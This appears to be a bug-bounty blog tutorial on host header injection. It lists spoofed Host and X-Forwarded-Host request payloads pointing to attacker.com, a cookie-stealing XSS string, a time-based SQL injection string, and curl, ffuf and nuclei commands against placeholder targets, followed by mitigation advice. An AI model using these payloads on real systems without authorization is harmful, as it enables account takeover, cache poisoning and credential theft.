Mastering Host Header Injection: Techniques, Payloads and Real-World Scenarios
Learn How Attackers Manipulate Host Headers to Compromise Web Applications and How to Defend Against It
coffinxp
coffinxp

Following
6 min read
·
May 8, 2025
229


5






Introduction
Host header injection is a web vulnerability that arises when a web application trusts the value of the Host header in HTTP requests without proper validation. Attackers can manipulate this header to influence how the server processes requests, potentially leading to cache poisoning, password reset poisoning, web cache deception and even full account takeover in some scenarios.

Understanding the various ways to manipulate the Host header is crucial for both attackers and defenders. Below we explore the most common and advanced techniques for host header manipulation with practical examples and explanations.

Common Host Header Injection Techniques
Spoofing with Malicious Domain
Supply a rogue domain in the Host header to trick the application into generating links or redirects pointing to the attacker’s server.

example:

GET /reset-password HTTP/1.1  
Host: attacker.com
Adding a Prefix
By supplying a different domain in the Host header attackers can trick the application into generating links, redirects or password reset emails pointing to a malicious site.

example:

GET /admin.php HTTP/1.1
Host: attackertarget.com
Absolute URL Path
Some applications parse the Host header as part of a full URL which can be abused to bypass filters or confuse backend logic.

example:

GET /admin.php HTTP/1.1
Host: https://target.com/admin.php
Subdomain Bypass
Using a subdomain can sometimes bypass simple host validation checks that only look for the presence of the main domain.

example:

GET /admin.php HTTP/1.1
Host: subdomain.target.com
Leading Space or Tab Injection
Some servers or proxies may ignore or mishandle headers that contain leading spaces or tabs, which can result in inconsistent parsing and unexpected behavior

example:

GET /admin.php HTTP/1.1
 Host: target.com
Specifying a Different Port
Specifying a port in the Host header can sometimes bypass host-based access controls or confuse backend logic.

example:

GET /admin.php HTTP/1.1
Host: target.com:8080
Using X-Forwarded-Host Header
Many applications and proxies use the X-Forwarded-Host header to determine the original host requested by the client making it a prime target for injection.

example:

GET /admin.php HTTP/1.1
X-Forwarded-Host: attacker.com
Using Server’s IP Address
Supplying the server’s IP address instead of the domain can sometimes bypass virtual host routing or access controls.

example:

GET /admin.php HTTP/1.1
Host: <target IP>
Blank Host Header
Some servers behave unexpectedly or default to the first virtual host when the Host header is empty.

example:

GET /admin.php HTTP/1.1
Host: 
Multiple Host Headers
Sending multiple Host headers can exploit inconsistencies between different server components (e.g., frontend and backend parsing).

example

GET /admin.php HTTP/1.1
Host: target.com
Host: attacker.com
Another Site on Same IP
If multiple domains are hosted on the same server, specifying a different valid domain can sometimes yield sensitive information or access to unintended resources.

example:

GET /admin.php HTTP/1.1
Host: target2.com
Advanced and Less Common Techniques
Host Header Injection in SSRF (Server-Side Request Forgery)
When internal SSRF filters rely on the Host header for validation, attackers can forge internal requests or bypass SSRF protections.

example:

Host: internal-service.local
Use case: Bypassing SSRF protections to reach internal APIs or metadata services.

DNS Rebinding via Host Header Injection
When combined with DNS rebinding an attacker might use a malicious host to trick the app into trusting a rebinding domain.

example:

Host: rebinding.attacker.com
Internal web app may process the request allowing the attacker to bypass same-origin policy or internal network protections

rbndr.us dns rebinding service
This page will help to generate a hostname for use with testing for dns rebinding vulnerabilities in software. To use…
lock.cmpxchg8b.com

Host Header with Special Characters
Injecting special characters (e.g., null bytes, CRLF, or Unicode) can sometimes bypass filters or cause parsing errors.

example:

GET /admin.php HTTP/1.1
Host: target.com%00.attacker.com
Host Header with Path Traversal
Some misconfigured applications may parse the host as part of the path leading to unexpected behavior.

example:

GET /admin.php HTTP/1.1
Host: ../../attacker.com
Host Header with Encoded Values
URL-encoding or double-encoding the host value can sometimes bypass validation.

example:

GET /admin.php HTTP/1.1
Host: %74%61%72%67%65%74.com
Chaining X-Forwarded Headers for SQLi & XSS Injection
Abusing HTTP Headers for XSS and SQLi: Tricks with X-Forwarded-Host and X-Forwarded-For:

X-Forwarded-Host: evil.com"><img src/onerror=prompt(document.cookie)>

X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Tools for Finding Header Injection Bugs
cURL
A versatile tool for manually testing header injection vulnerabilities.
Quickly send crafted requests with custom headers to identify misconfigurations or potential exploits.

example:

curl -I -H "Host: attacker.com" https://target.com
curl -I -H "X-Forwarded-Host: attacker.com" https://target.com
Burp Suite
Go to the Repeater tab, select the Host Header Injection option and choose your desired configuration. The tool will begin scanning for Host Header Injection vulnerabilities one by one. You can monitor the progress in the Flow tab, Once the scan is complete you can check the Burp Dashboard to see if any Host Header Injection vulnerabilities were detected


Nuclei
A fast and flexible vulnerability scanner designed for automated security testing. Just use this Nuclei template for testing header injection vulnerabilities:

example:

nuclei -u https://target.com -t x-forwarded.yaml
nuclei-templates/x-forwarded.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com

Ffuf
A fast and flexible tool for fuzzing custom headers and finding vulnerabilities. this allows you to fuzz HTTP headers efficiently making it ideal for testing header injection vulnerabilities like Host or X-Forwarded-Host etc.

example:

ffuf -u https://target.com -H "Host: FUZZ" -w hosts.txt
Gau / Waybackurls
Combine URL collectors like Gau or Waybackurls with custom scripts to efficiently test hosts for header injection vulnerabilities.

example:

cat domains.txt | while read url; do curl -H "Host: attacker.com" "$url"; done
Browser Extension
Chrome extension to manually modify headers like Host and X-Forwarded-Host.

ModHeader - Modify HTTP headers - Chrome Web Store
Modify HTTP request headers, response headers, and redirect URLs
chromewebstore.google.com

Automation tools
GitHub - devanshbatham/headerpwn: A fuzzer for finding anomalies and analyzing how servers respond…
A fuzzer for finding anomalies and analyzing how servers respond to different HTTP headers - devanshbatham/headerpwn
github.com

GitHub - roottusk/xforwardy: Host Header Injection Scanner
Host Header Injection Scanner. Contribute to roottusk/xforwardy development by creating an account on GitHub.
github.com

GitHub - pikpikcu/hostinject: hostinject (Host Header Injection) Tool is a Python script that…
hostinject (Host Header Injection) Tool is a Python script that allows you to perform host header injection…
github.com

Real-World Impact
Host header injection can lead to a variety of attacks including:

Web Cache Poisoning: Poisoning shared caches with malicious content.
Password Reset Poisoning: Causing password reset emails to contain attacker-controlled links.
Open Redirects: Redirecting users to malicious sites.
Bypassing Access Controls: Gaining unauthorized access to internal resources.
Mitigation Strategies
Strict Host Validation: Only allow a predefined list of trusted hosts.
Use Host Whitelisting: Validate hostnames against a known-safe list before use.
Avoid Host Header Usage: Don’t rely on Host headers to construct critical links or logic.
Disable Unnecessary Headers: Avoid using X-Forwarded-Host, X-Host, etc., unless absolutely necessary.
Conclusion
Host header injection remains a critical vulnerability in modern web applications especially those relying on virtual hosting or reverse proxies. By understanding and testing the various manipulation techniques, security professionals can better identify and remediate these issues before attackers exploit them.

Upnext: If you found this helpful, you’ll definitely want to check out my article The Ultimate Guide to Email Input Field Vulnerability Testing. It’s a hands-on guide to uncover hidden flaws in email fields that can lead to serious bugs 👇

The Ultimate Guide to Email Input Field Vulnerability Testing
Real-world methods and payloads for testing email field security
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
